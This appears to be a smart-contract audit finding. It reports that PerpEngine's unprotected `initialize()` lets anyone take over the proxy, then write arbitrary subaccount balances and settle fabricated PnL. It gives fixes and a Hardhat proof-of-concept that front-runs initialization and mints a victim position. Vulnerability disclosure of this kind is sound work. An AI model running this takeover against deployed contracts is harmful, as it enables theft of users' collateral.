### Title
Uninitialized Proxy Takeover via Unrestricted `initialize()` — (`core/contracts/PerpEngine.sol`)

---

### Summary

`PerpEngine.initialize()` is `external` with no access control. It delegates to `BaseEngine._initialize()`, which is guarded only by OpenZeppelin's `initializer` modifier (one-time execution). No `_disableInitializers()` call exists in any implementation contract constructor. During the window between proxy deployment and the protocol's own initialization call, any EOA can front-run and become the effective protocol authority over the PerpEngine proxy.

---

### Finding Description

`PerpEngine.initialize()` accepts five attacker-controlled addresses and passes three of them directly into `canApplyDeltas`: [1](#0-0) 

`_initialize()` in `BaseEngine` uses the `initializer` modifier (one-time guard) but has no `msg.sender` restriction: [2](#0-1) 

The `initializer` modifier only prevents a second call — it does not restrict *who* makes the first call. If the attacker passes their own EOA as `_clearinghouseAddr`, `_offchainExchangeAddr`, or `_endpointAddr`, then `canApplyDeltas[attackerEOA]` is set to `true`.

`_assertInternal()` is the sole guard on `updateBalance()`: [3](#0-2) 

With `canApplyDeltas[attackerEOA] == true`, the attacker satisfies this check and can call `updateBalance()` directly: [4](#0-3) 

Neither `PerpEngine`, `PerpEngineState`, `BaseEngine`, nor `EndpointGated` define a constructor calling `_disableInitializers()`, leaving the implementation contract itself also vulnerable to direct initialization. [5](#0-4) 

---

### Impact Explanation

An attacker who initializes the proxy first:
- Sets `canApplyDeltas[attackerEOA] = true`
- Calls `updateBalance(productId, victimSubaccount, largeAmount, largeVQuote)` to write arbitrary `amount` and `vQuoteBalance` into any subaccount's `balances` storage
- Calls `settlePnl()` (also gated only by `_assertInternal()`) to drain collateral from the clearinghouse via the fabricated PnL [6](#0-5) 

---

### Likelihood Explanation

The race window exists between proxy deployment and the protocol's initialization transaction. On any public network this is a non-zero window. Additionally, if initialization is accidentally omitted from a deployment script (no deployment scripts exist in the scoped repository), the proxy remains permanently hijackable.

---

### Recommendation

1. Add `_disableInitializers()` to the implementation contract constructor in `PerpEngine` (and all engine contracts) to prevent direct initialization of the implementation.
2. Add an access control check to `PerpEngine.initialize()` — e.g., restrict to a deployer EOA or factory address passed at construction time, or use a `onlyDeployer` pattern as seen in `ContractOwner`: [7](#0-6) [8](#0-7) 

3. Ensure proxy deployment and `initialize()` are executed atomically in a single transaction (e.g., via a factory or constructor-level call).

---

### Proof of Concept

```solidity
// Hardhat test — unmodified proxy
const PerpEngine = await ethers.getContractFactory("PerpEngine");
const proxy = await upgrades.deployProxy(PerpEngine, { initializer: false }); // deploy without init

const [attacker, victim] = await ethers.getSigners();

// Step 1: attacker initializes with their own EOA as all three privileged addresses
await proxy.connect(attacker).initialize(
    attacker.address,  // _clearinghouse  -> canApplyDeltas[attacker] = true
    attacker.address,  // _offchainExchange
    ethers.constants.AddressZero, // ignored param
    attacker.address,  // _endpoint
    attacker.address   // _admin
);

assert((await proxy.canApplyDeltas(attacker.address)) === true);

// Step 2: attacker writes arbitrary balance for victim subaccount
const victimSubaccount = ethers.utils.formatBytes32String("victim");
await proxy.connect(attacker).updateBalance(
    0,                          // productId
    victimSubaccount,
    ethers.utils.parseUnits("1000000", 18),  // amountDelta
    ethers.utils.parseUnits("1000000", 18)   // vQuoteDelta
);

const balance = await proxy.balances(0, victimSubaccount);
assert(balance.amount.gt(0)); // arbitrary perp position minted
```

    function settlePnl(bytes32 subaccount, uint256 productIds)
        external
        returns (int128)
    {
        _assertInternal();
        int128 totalSettled = 0;

        while (productIds != 0) {
            uint32 productId = uint32(productIds & ((1 << 32) - 1));
            // otherwise it means the product is a spot.
            if (productId % 2 == 0) {
                (
                    int128 canSettle,
                    State memory state,
                    Balance memory balance
                ) = getSettlementState(productId, subaccount);

                state.availableSettle -= canSettle;
                balance.vQuoteBalance -= canSettle;

                totalSettled += canSettle;

                _setState(productId, state);
                _setBalanceAndUpdateBitmap(productId, subaccount, balance);
            }
            productIds >>= 32;
        }
        return totalSettled;
    }
